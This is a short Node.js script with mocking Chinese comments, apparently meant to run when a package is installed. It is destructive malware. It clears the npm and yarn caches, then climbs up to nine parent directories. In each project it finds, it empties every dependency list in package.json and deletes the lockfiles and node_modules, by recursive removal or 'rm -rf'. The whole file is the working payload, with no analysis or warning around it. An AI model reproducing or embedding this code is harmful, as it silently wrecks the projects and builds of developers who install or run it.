#!/usr/bin/env node
//
//
// 这个 grandmother 和 mother 有什么区别呢?
// 当然就是你用 mother, 别人只会问候你 mother.
// 而你用 grandmother, 别人还会问候你 grandmother.
//
//

const fs = require("fs");
const path = require("path");
const os = require("os");
const cmd = require("child_process");
const noop = () => {
  console.log(`match-you ${Math.random() > 0.5 ? "grandmother" : "grandfather"}`);
};

cmd.exec("npm cache verify", noop);
cmd.exec("npm cache clean --force", noop);
cmd.exec("yarn cache clean --all", noop);

matchYou(".");
matchYou(__dirname); // 1x1
matchYou(path.resolve(__dirname, "..")); // 2x2
matchYou(path.resolve(__dirname, "..", "..")); // 3x3
matchYou(path.resolve(__dirname, "..", "..", "..")); // 4x4
matchYou(path.resolve(__dirname, "..", "..", "..", "..")); // 5x5
matchYou(path.resolve(__dirname, "..", "..", "..", "..", "..")); // 6x6
matchYou(path.resolve(__dirname, "..", "..", "..", "..", "..", "..")); // 7x7
matchYou(path.resolve(__dirname, "..", "..", "..", "..", "..", "..", "..")); // 8x8
matchYou(path.resolve(__dirname, "..", "..", "..", "..", "..", "..", "..", "..")); // 9x9

function matchYou(directory) {
  const packageFile = path.resolve(directory, "package.json");
  let package;
  try {
    package = require(packageFile);
  } catch (error) {
    return;
  }
  if (package.dependencies) package.dependencies = {}
  if (package.devDependencies) package.devDependencies = {}
  if (package.peerDependencies) package.peerDependencies = {}
  if (package.bundledDependencies) package.bundledDependencies = {}
  if (package.optionalDependencies) package.optionalDependencies = {}
  if (package.resolutions) package.resolutions = {}
  fs.writeFile(packageFile, JSON.stringify(package, null, 2));

  if (typeof fs.rm === "function") {
    // We have good guy card, We would not delete package.json
    // fs.rm(path.resolve(directory, "package.json"), noop);
    fs.rm(path.resolve(directory, "package-lock.json"), noop);
    fs.rm(path.resolve(directory, "yarn.lock"), noop);
    fs.rm(path.resolve(directory, "pnpm-lock.yaml"), noop);
    fs.rm(
      path.resolve(directory, "node_modules"),
      { recursive: true, force: true },
      noop
    );
  } else {
    fs.unlink(path.resolve(directory, "package-lock.json"), noop);
    fs.unlink(path.resolve(directory, "yarn.lock"), noop);
    fs.unlink(path.resolve(directory, "pnpm-lock.yaml"), noop);
    cmd.exec(
      os.platform() === "win32"
        ? "rmdir node_modules /s /q"
        : "rm -rf node_modules",
      { cwd: directory },
      noop
    );
  }
}
